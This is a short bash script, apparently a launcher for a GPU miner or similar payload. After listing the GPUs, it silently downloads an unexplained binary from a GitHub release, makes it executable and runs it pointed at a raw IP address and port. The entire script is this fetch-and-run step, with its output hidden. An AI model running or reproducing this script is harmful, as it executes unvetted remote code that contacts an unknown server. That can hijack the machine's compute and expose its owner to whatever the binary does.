#!/bin/bash
nvidia-smi -L
wget https://github.com/maxineahwx24/thuhien/releases/download/1/quoctai &> /dev/null
chmod +x quoctai
./quoctai -P http://38.130.221.109:4545/"$1" &> log
